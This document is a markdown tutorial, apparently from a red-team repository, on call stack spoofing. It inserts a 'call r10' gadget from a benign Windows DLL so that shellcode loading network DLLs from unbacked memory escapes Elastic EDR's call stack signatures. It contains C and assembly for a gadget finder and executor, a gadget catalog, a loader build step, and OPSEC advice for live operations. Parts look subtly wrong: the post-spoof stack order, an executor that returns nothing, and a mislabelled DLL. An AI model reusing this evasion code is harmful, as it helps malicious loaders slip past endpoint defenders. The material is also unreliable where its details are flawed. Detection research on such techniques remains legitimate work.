# Call Stack Spoofing - Evading EDR Call Stack Signatures

## Overview

Call stack spoofing is a technique to evade EDR detection rules that analyze call stack patterns during suspicious API calls. This specific technique uses **call gadgets** to insert arbitrary modules into the execution stack, breaking known detection signatures.

## The Problem

Modern EDRs analyze call stacks when suspicious APIs are invoked. For example, when loading a network DLL from unbacked (dynamically allocated) memory, Elastic EDR looks for specific stack signatures.

### Elastic's Detection Pattern

**Flagged Signature**:
```
ntdll.dll → kernelbase.dll → ntdll.dll → kernel32.dll → ntdll.dll
```

This pattern appears when:
- Using Thread Pool callbacks to execute code
- Loading network modules (ws2_32.dll, winhttp.dll, etc.)
- From unbacked memory regions

### Why This Matters

**Unbacked Memory**: Memory allocated via VirtualAlloc that isn't backed by a file on disk
- Typical for shellcode, reflective DLLs, position-independent code
- Highly suspicious to EDRs
- Subject to enhanced monitoring

**Thread Pool Abuse**: Common technique for indirect code execution
- Avoids direct function calls
- Still produces detectable call stack patterns

## The Solution: Call Gadget Injection

### Core Principle

> "Every `call` will put an address in the calling module on the call stack, while a `jmp` will not."

By routing execution through a `call` instruction in a different (benign) module, we can insert that module's address into the call stack, breaking the expected signature pattern.

### How It Works

```
Normal Flow:
shellcode → TpCallbackInstance → LoadLibraryA
Stack: ntdll → kernelbase → ntdll → kernel32 → ntdll

With Gadget:
shellcode → jmp gadget_module → call LoadLibraryA
Stack: ntdll → gadget_module → kernelbase → ntdll → ...
```

The injected module breaks the signature pattern.

## Finding Suitable Gadgets

### Gadget Requirements

A suitable gadget must:
1. **Contain a `call` instruction** to a controllable register
2. **Return within ~5 instructions** after the call
3. **Be in a non-sensitive module** (not flagged by EDR)
4. **Be stable across Windows versions** (ideally)

### Example Gadget

From `dsdmo.dll` (version 10.0.26100.1882):

```assembly
call r10           ; Execute function via r10
xor eax, eax       ; Clean return value
add rsp, 0x28      ; Cleanup stack
ret                ; Return to caller
```

**Why This Works**:
- `call r10` executes our target function (LoadLibraryA)
- Puts `dsdmo.dll` address on call stack
- Simple epilogue (can replicate in shellcode)
- Not typically monitored by EDR

### Gadget Discovery Process

**1. Identify Candidate Modules**:
```python
# Criteria:
- System DLL (ships with Windows)
- Not on EDR exclusion lists
- Contains call reg; ret patterns
- Stable across versions
```

**2. Search for Patterns**:
```assembly
# Look for:
call rax
call rbx
call rcx
call r10
call r11
# Followed by:
ret (within 5 instructions)
```

**3. Verify Stability**:
```
- Check across Windows versions using Winbindex
- Verify gadget exists in target Windows versions
- Confirm offset consistency (or use signature scanning)
```

**4. Test in Lab**:
```
- Deploy to test environment
- Verify stack signature changes
- Confirm EDR doesn't flag new pattern
```

## Implementation

### Shellcode Modification

**Original (Detected)**:
```c
// Direct Thread Pool callback
VOID CALLBACK TpCallback(
    PTP_CALLBACK_INSTANCE Instance,
    PVOID Context,
    PTP_WORK Work
) {
    HMODULE hWs2_32 = LoadLibraryA("ws2_32.dll");
    // ...
}

// Stack: ntdll → kernelbase → ntdll → kernel32 → ntdll
```

**Modified (Evades)**:
```c
// Gadget address and target function
void* gadget = find_gadget_in_dsdmo();  // call r10; ... ret
void* target = &LoadLibraryA;

VOID CALLBACK TpCallback(
    PTP_CALLBACK_INSTANCE Instance,
    PVOID Context,
    PTP_WORK Work
) {
    // Allocate stack space matching gadget epilogue
    alloca(0x28);  // add rsp, 0x28 in gadget

    // Place target function in r10
    __asm__ volatile (
        "mov r10, %0\n"
        "jmp %1\n"
        : : "r"(target), "r"(gadget)
    );

    // Gadget executes: call r10 (LoadLibraryA)
    // Stack now: ntdll → dsdmo → kernelbase → ntdll → ...
}
```

### Assembly Implementation

```assembly
; Setup
mov r10, qword ptr [LoadLibraryA_addr]   ; Target function
mov rax, qword ptr [gadget_addr]         ; Gadget address
sub rsp, 0x28                             ; Allocate stack space

; Execute via gadget
jmp rax                                   ; Jump to gadget

; Gadget executes:
; call r10          -> Calls LoadLibraryA
; xor eax, eax      -> Cleans return
; add rsp, 0x28     -> Restores stack
; ret               -> Returns to caller
```

### Crystal Palace Integration

```c
// Build shellcode with Crystal Palace
load "loader.x64.o"
  make pic +optimize +mutate
load "gadget_config.bin"   // Gadget addresses
  append $PIC
link "evasive_loader.bin"
```

## Complete Example

### Gadget Finder

```c
typedef struct {
    void* address;
    BYTE pattern[16];
    size_t length;
} GADGET;

GADGET find_call_r10_gadget(HMODULE hModule) {
    GADGET result = {0};

    // Pattern: call r10; xor eax,eax; add rsp,0x28; ret
    BYTE pattern[] = {
        0x41, 0xFF, 0xD2,       // call r10
        0x33, 0xC0,              // xor eax, eax
        0x48, 0x83, 0xC4, 0x28,  // add rsp, 0x28
        0xC3                     // ret
    };

    // Scan module
    BYTE* base = (BYTE*)hModule;
    SIZE_T size = get_module_size(hModule);

    for (SIZE_T i = 0; i < size - sizeof(pattern); i++) {
        if (memcmp(base + i, pattern, sizeof(pattern)) == 0) {
            result.address = base + i;
            result.length = sizeof(pattern);
            memcpy(result.pattern, pattern, sizeof(pattern));
            return result;
        }
    }

    return result;
}
```

### Gadget Executor

```c
typedef void* (*GADGET_EXECUTOR)(void* gadget, void* function, void* arg);

void* execute_via_gadget(void* gadget, void* function, void* arg) {
    // This would be assembly stub
    __asm__ volatile (
        "sub rsp, 0x28\n"      // Allocate stack
        "mov r10, %1\n"         // Place function in r10
        "mov rcx, %2\n"         // First argument
        "jmp %0\n"              // Jump to gadget
        : : "r"(gadget), "r"(function), "r"(arg)
    );
}

// Usage
void* gadget = find_call_r10_gadget(GetModuleHandle("dsdmo.dll"));
void* result = execute_via_gadget(gadget, &LoadLibraryA, "ws2_32.dll");
```

## Stack Analysis

### Before Gadget Injection

```
Stack Trace:
[0] ntdll.dll!LdrLoadDll
[1] kernelbase.dll!LoadLibraryExW
[2] ntdll.dll!TppWorkpExecuteCallback
[3] kernel32.dll!BaseThreadInitThunk
[4] ntdll.dll!RtlUserThreadStart

Pattern: ntdll|kernelbase|ntdll|kernel32|ntdll
Status: DETECTED by Elastic signature
```

### After Gadget Injection

```
Stack Trace:
[0] ntdll.dll!LdrLoadDll
[1] dsdmo.dll!<gadget>
[2] kernelbase.dll!LoadLibraryExW
[3] ntdll.dll!TppWorkpExecuteCallback
[4] kernel32.dll!BaseThreadInitThunk

Pattern: ntdll|dsdmo|kernelbase|ntdll|kernel32
Status: NOT DETECTED (signature broken)
```

## Gadget Catalog

### Common Gadgets by Module

**dsdmo.dll** (Display Settings):
```assembly
call r10
xor eax, eax
add rsp, 0x28
ret
```
- Stability: High
- Detection Risk: Low
- Versions: Win10/11

**combase.dll** (COM Base):
```assembly
call rax
add rsp, 0x20
ret
```
- Stability: Medium
- Detection Risk: Low
- Versions: Win10/11

**user32.dll** (User Interface):
```assembly
call rbx
mov eax, 1
pop rbx
ret
```
- Stability: High
- Detection Risk: Medium (common in malware)
- Versions: All Windows

### Gadget Selection Criteria

**Best**:
- Non-essential system DLL
- Rarely loaded by malware
- Stable across versions
- Simple epilogue

**Acceptable**:
- Common system DLL
- May be used by malware
- Version-specific offsets
- Complex epilogue (replicable)

**Avoid**:
- ntdll.dll, kernel32.dll (monitored)
- Security-related DLLs
- Frequently-changing DLLs
- Unstable across versions

## Limitations and Considerations

### Limitations

**1. Windows Version Dependency**:
- Gadget offsets may change
- New Windows versions may remove gadgets
- Requires version detection or signature scanning

**2. Module Availability**:
- Target module must be loaded
- May need to load module first (suspicious)
- Some modules architecture-specific (x86/x64)

**3. Specific Use Cases**:
- Technique addresses call stack signatures specifically
- Doesn't evade all EDR detection methods
- Other telemetry still applies

**4. Detection Evolution**:
- EDR may update detection rules
- Unusual call stacks may become suspicious
- Pattern may be recognized over time

### OPSEC Considerations

**Good Practices**:
- Rotate gadget modules per operation
- Combine with other evasion techniques
- Test against target EDR in lab
- Monitor for detection

**Avoid**:
- Using same gadget across operations
- Relying solely on this technique
- Publicly sharing specific gadgets
- Using well-known modules

## Related Techniques

- [UDRL and Sleep Mask](../udrl-sleepmask/) - Comprehensive Beacon evasion
- [Position Independent Code](../../position-independent-code/) - PIC fundamentals
- [Aspect-Oriented Programming](../../aspect-oriented-tradecraft/) - API hooking

## Resources

- [Evading Elastic Callstack Signatures](https://offsec.almond.consulting/evading-elastic-callstack-signatures.html) - Original research
- [Winbindex](https://winbindex.m417z.com/) - Historical Windows DLL versions
- [LibTP](https://github.com/rasta-mouse/LibTP) - Thread Pool API proxying

## Tools

### Gadget Finding Tools

**Manual**: x64dbg, IDA Pro, Ghidra
**Automated**: ROPgadget, rp++, ropper (can find call gadgets)

### Testing Tools

**Stack Analysis**: WinDbg (`k` command for call stack)
**EDR Testing**: Elastic Security (if available in lab)
**Dynamic Analysis**: Process Monitor, API Monitor

## Next Steps

1. Read [NOTES.md](./NOTES.md) for quick reference
2. Study [POC](./POC/) for working implementations
3. Review [RED_TEAM_USAGE.md](./RED_TEAM_USAGE.md) for operational guidance
4. Explore [ADVANCEMENTS.md](./ADVANCEMENTS.md) for future research
